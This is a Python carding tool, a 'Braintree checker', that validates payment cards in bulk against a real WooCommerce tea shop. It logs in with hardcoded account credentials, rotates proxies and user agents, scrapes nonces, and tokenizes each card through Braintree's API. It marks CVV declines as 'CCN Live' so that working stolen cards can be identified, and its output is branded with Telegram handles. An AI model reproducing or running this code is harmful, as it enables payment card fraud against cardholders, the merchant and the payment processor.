import httpx
import re
import random
import base64
import asyncio
import time
import os
from user_agent import generate_user_agent

class BraintreeChecker:
    def __init__(self):
        self.accounts = []
        self.proxies = []
        self.current_account_index = 0
        self.current_proxy_index = 0
        self.session_delay = 1
        
    def load_accounts(self):
        """Load accounts from the code or file"""
        self.accounts = [
            {"email": "atomicguillemette@tiffincrane.com", "password": "Simon99007"},
            {"email": "verbalmarti@tiffincrane.com", "password": "Simon99007"},
            {"email": "deeannewasteful@tiffincrane.com", "password": "Simon99007"},
            {"email": "blue8874@tiffincrane.com", "password": "Simon99007"},
            {"email": "homely120@tiffincrane.com", "password": "Simon99007"},
            {"email": "7576olga@tiffincrane.com", "password": "Simon99007"},
            {"email": "grubbyflorina@tiffincrane.com", "password": "Simon99007"}
        ]
    
    def load_proxies(self):
        """Load proxies from file"""
        if os.path.exists('proxy.txt'):
            with open('proxy.txt', 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        return self.proxies
    
    def get_next_account(self):
        """Get next account with rotation"""
        if not self.accounts:
            return None
        
        account = self.accounts[self.current_account_index]
        self.current_account_index = (self.current_account_index + 1) % len(self.accounts)
        return account
    
    def get_next_proxy(self):
        """Get next proxy with rotation"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return proxy
    
    def parse_proxy(self, proxy_str):
        """Parse proxy string to httpx format"""
        try:
            if ":" in proxy_str:
                parts = proxy_str.split(":")
                if len(parts) == 4:
                    # Format: ip:port:username:password
                    ip, port, username, password = parts
                    return f"http://{username}:{password}@{ip}:{port}"
                elif len(parts) == 2:
                    # Format: ip:port
                    ip, port = parts
                    return f"http://{ip}:{port}"
        except:
            pass
        return None
    
    def get_bin_info(self, bin_number):
        """Simple BIN lookup"""
        if not bin_number or len(bin_number) < 6:
            return {
                'bank': 'Unavailable',
                'country': 'Unknown', 
                'brand': 'Unknown',
                'type': 'Unknown',
                'level': 'Unknown',
                'emoji': '🏳️'
            }
        
        try:
            response = httpx.get(f'https://lookup.binlist.net/{bin_number}', timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data and data.get('scheme'):
                    return {
                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'brand': data.get('scheme', 'Unknown').upper(),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('brand', 'Unknown'),
                        'emoji': data.get('country', {}).get('emoji', '🏳️')
                    }
        except:
            pass
        
        # Fallback pattern matching
        if bin_number.startswith('4'):
            brand = 'VISA'
        elif bin_number.startswith('5'):
            brand = 'MASTERCARD'
        elif bin_number.startswith('34') or bin_number.startswith('37'):
            brand = 'AMEX'
        elif bin_number.startswith('6'):
            brand = 'DISCOVER'
        else:
            brand = 'UNKNOWN'
        
        return {
            'bank': f"{brand} BANK",
            'country': 'Unknown',
            'brand': brand,
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': '🏳️'
        }
    
    async def check_single_card(self, card_line):
        """Check a single card with account rotation"""
        start_time = time.time()
        
        try:
            parts = card_line.strip().split('|')
            if len(parts) != 4:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {card_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid card format
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 🏳️
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            n, mm, yy, cvc = parts
            
            # Format month and year
            if len(mm) == 1:
                mm = f'0{mm}'
            if "20" not in yy:
                yy = f'20{yy}'
            
            # Get account and proxy
            account = self.get_next_account()
            if not account:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ No accounts available
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 🏳️
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            proxy_str = self.get_next_proxy()
            proxies = self.parse_proxy(proxy_str) if proxy_str else None
            
            # Process card
            result, response_message = await self.process_card(n, mm, yy, cvc, account, proxies)
            elapsed_time = time.time() - start_time
            
            # Get BIN info
            bin_info = self.get_bin_info(n[:6])
            
            # Format result based on response - CVV declines are APPROVED
            if result == "APPROVED":
                return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            else:
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
        except Exception as e:
            elapsed_time = time.time() - start_time
            return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {card_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 🏳️
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
    
    async def process_card(self, cc, mm, yy, cvc, account, proxies=None):
        """Process a single card with given account and proxy"""
        try:
            user = generate_user_agent()
            
            # Configure proxy if available
            transport = None
            if proxies:
                transport = httpx.AsyncHTTPTransport(proxy=proxies, retries=3)
            
            async with httpx.AsyncClient(
                follow_redirects=True,
                timeout=30,
                transport=transport
            ) as client:
                headers = {
                    'authority': 'www.tea-and-coffee.com',
                    'user-agent': user,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                }
                
                # Step 1: Get login page
                response = await client.get('https://www.tea-and-coffee.com/account/', headers=headers)
                
                # Find login nonce
                login_nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
                if not login_nonce_match:
                    return 'DECLINED', 'Could not find login nonce'
                
                nonce = login_nonce_match.group(1)

                # Step 2: Login with account credentials
                data = {
                    'username': account['email'],
                    'password': account['password'],
                    'woocommerce-login-nonce': nonce,
                    '_wp_http_referer': '/account/',
                    'login': 'Log in',
                }
                
                response = await client.post(
                    'https://www.tea-and-coffee.com/account/',
                    headers=headers,
                    data=data
                )
                
                # Check if login was successful
                if not ('Log out' in response.text or 'My Account' in response.text or 'account' in str(response.url)):
                    return 'DECLINED', 'Login failed'
                
                # Step 3: Navigate to add payment method
                headers.update({
                    'referer': 'https://www.tea-and-coffee.com/account/',
                })
                
                # Try custom payment method page first
                response = await client.get(
                    'https://www.tea-and-coffee.com/account/add-payment-method-custom/',
                    headers=headers
                )

                if response.status_code != 200:
                    response = await client.get(
                        'https://www.tea-and-coffee.com/account/add-payment-method/',
                        headers=headers
                    )

                # Find payment nonce
                payment_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
                if not payment_nonce_match:
                    return 'DECLINED', 'Could not find payment nonce'
                
                nonce = payment_nonce_match.group(1)

                # Find client nonce for Braintree
                client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
                if not client_nonce_match:
                    return 'DECLINED', 'Could not find client token nonce'
                
                client_nonce = client_nonce_match.group(1)
                
                headers.update({
                    'x-requested-with': 'XMLHttpRequest',
                    'referer': str(response.url),
                })

                # Step 4: Get client token
                data = {
                    'action': 'wc_braintree_credit_card_get_client_token',
                    'nonce': client_nonce,
                }

                response = await client.post(
                    'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
                    headers=headers,
                    data=data
                )
                
                if 'data' not in response.json():
                    return 'DECLINED', 'No data in client token response'
                    
                enc = response.json()['data']
                dec = base64.b64decode(enc).decode('utf-8')
                
                # Find authorization
                authorization_match = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
                if not authorization_match:
                    return 'DECLINED', 'Could not find authorization fingerprint'
                authorization = authorization_match[0]

                # Step 5: Tokenize card
                headersn = {
                    'authority': 'payments.braintree-api.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'authorization': f'Bearer {authorization}',
                    'braintree-version': '2018-05-10',
                    'content-type': 'application/json',
                    'origin': 'https://assets.braintreegateway.com',
                    'referer': 'https://assets.braintreegateway.com/',
                    'user-agent': user,
                }

                json_data = {
                    'clientSdkMetadata': {
                        'source': 'client',
                        'integration': 'custom',
                        'sessionId': str(random.randint(1000000000, 9999999999)),
                    },
                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
                    'variables': {
                        'input': {
                            'creditCard': {
                                'number': cc,
                                'expirationMonth': mm,
                                'expirationYear': yy,
                                'cvv': cvc,
                            },
                            'options': {
                                'validate': False,
                            },
                        },
                    },
                }
                
                response = await client.post(
                    'https://payments.braintree-api.com/graphql',
                    headers=headersn,
                    json=json_data
                )

                # Check tokenization response
                if 'data' not in response.json() or 'tokenizeCreditCard' not in response.json()['data']:
                    error_text = response.text
                    
                    # Capture specific response codes - CVV related are APPROVED
                    if '2010' in error_text:
                        return 'APPROVED', 'Status code 2010: Card Issuer Declined CVV (CCN Live)'
                    elif 'cvv' in error_text.lower() or 'security code' in error_text.lower():
                        return 'APPROVED', 'CVV Check Failed (CCN Live)'
                    elif 'incorrect_cvc' in error_text.lower():
                        return 'APPROVED', 'Incorrect CVC (CCN Live)'
                    
                    # Other specific status codes
                    elif '2001' in error_text:
                        return 'DECLINED', 'Status code 2001: Insufficient Funds'
                    elif '2000' in error_text:
                        return 'DECLINED', 'Status code 2000: Do Not Honor'
                    elif '2002' in error_text:
                        return 'DECLINED', 'Status code 2002: Lost Card'
                    elif '2003' in error_text:
                        return 'DECLINED', 'Status code 2003: Stolen Card'
                    elif '2004' in error_text:
                        return 'DECLINED', 'Status code 2004: Expired Card'
                    elif '2005' in error_text:
                        return 'DECLINED', 'Status code 2005: Invalid Card Number'
                    elif '2006' in error_text:
                        return 'DECLINED', 'Status code 2006: Invalid Expiration Date'
                    elif '2011' in error_text:
                        return 'DECLINED', 'Status code 2011: Voice Authorization Required'
                    elif '2012' in error_text:
                        return 'DECLINED', 'Status code 2012: Processing Error'
                    elif '2013' in error_text:
                        return 'DECLINED', 'Status code 2013: Invalid Merchant'
                    elif '2014' in error_text:
                        return 'DECLINED', 'Status code 2014: Pick Up Card'
                    
                    # Generic error patterns
                    elif 'avs' in error_text.lower():
                        return 'DECLINED', 'AVS Check Failed'
                    elif 'risk' in error_text.lower():
                        return 'DECLINED', 'Risk BIN - Retry Later'
                    elif 'do not honor' in error_text.lower():
                        return 'DECLINED', 'Do Not Honor'
                    elif 'gateway rejected' in error_text.lower():
                        return 'DECLINED', 'Gateway Rejected'
                    elif 'processor declined' in error_text.lower():
                        return 'DECLINED', 'Processor Declined'
                    elif 'insufficient' in error_text.lower():
                        return 'DECLINED', 'Insufficient Funds'
                    elif 'expired' in error_text.lower():
                        return 'DECLINED', 'Expired Card'
                    elif 'invalid' in error_text.lower():
                        return 'DECLINED', 'Invalid Card'
                    else:
                        return 'DECLINED', 'Tokenization failed: ' + error_text[:100]
                    
                tok = response.json()['data']['tokenizeCreditCard']['token']

                # Step 6: Process payment
                current_url_str = str(response.url)
                if 'add-payment-method-custom' in current_url_str:
                    endpoint = 'https://www.tea-and-coffee.com/account/add-payment-method-custom/'
                    referer = 'https://www.tea-and-coffee.com/account/add-payment-method-custom/'
                    wp_referer = '/account/add-payment-method-custom/'
                else:
                    endpoint = 'https://www.tea-and-coffee.com/account/add-payment-method/'
                    referer = 'https://www.tea-and-coffee.com/account/add-payment-method/'
                    wp_referer = '/account/add-payment-method/'

                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.tea-and-coffee.com',
                    'referer': referer,
                    'user-agent': user,
                }

                data = {
                    'payment_method': 'braintree_credit_card',
                    'wc-braintree-credit-card-card-type': 'visa',
                    'wc-braintree-credit-card-3d-secure-enabled': '',
                    'wc-braintree-credit-card-3d-secure-verified': '',
                    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                    'wc_braintree_credit_card_payment_nonce': tok,
                    'wc_braintree_device_data': '',
                    'wc-braintree-credit-card-tokenize-payment-method': 'true',
                    'woocommerce-add-payment-method-nonce': nonce,
                    '_wp_http_referer': wp_referer,
                    'woocommerce_add_payment_method': '1',
                }
                
                response = await client.post(
                    endpoint,
                    headers=headers,
                    data=data
                )
                
                if 'Payment method successfully added' in response.text:
                    return 'APPROVED', 'Payment method successfully added'
                elif 'woocommerce-error' in response.text:
                    error_match = re.search(r'woocommerce-error[^>]*>.*?<li>(.*?)</li>', response.text, re.DOTALL)
                    if error_match:
                        error_msg = error_match.group(1).strip()
                        # Check if it's a CVV related error for APPROVED
                        if any(term in error_msg.lower() for term in ['cvv', 'security code', 'cvc']):
                            return 'APPROVED', f'CVV Error: {error_msg} (CCN Live)'
                        else:
                            return 'DECLINED', error_msg
                    return "DECLINED", 'Unknown payment error'
                else:
                    return "DECLINED", 'Generic payment decline'

        except Exception as e:
            return 'DECLINED', f'Processing error: {str(e)}'

# Global checker instance
braintree_checker = BraintreeChecker()

def initialize_braintree():
    """Initialize the Braintree checker"""
    braintree_checker.load_accounts()
    braintree_checker.load_proxies()
    return "✅ Braintree checker initialized"

async def check_card_braintree(cc_line):
    """Main function to check card via Braintree (single card)"""
    return await braintree_checker.check_single_card(cc_line)

async def check_cards_braintree(cc_lines):
    """Mass check function for multiple cards"""
    results = []
    for cc_line in cc_lines:
        result = await check_card_braintree(cc_line)
        results.append(result)
        await asyncio.sleep(2)  # Delay between checks
    return results

# For standalone testing
if __name__ == "__main__":
    # Initialize the checker
    initialize_braintree()
    
    # Test with a single card
    async def test():
        test_cc = "4111111111111111|12|2025|123"
        print("Testing Braintree checker...")
        result = await check_card_braintree(test_cc)
        print(result)
    
    asyncio.run(test())
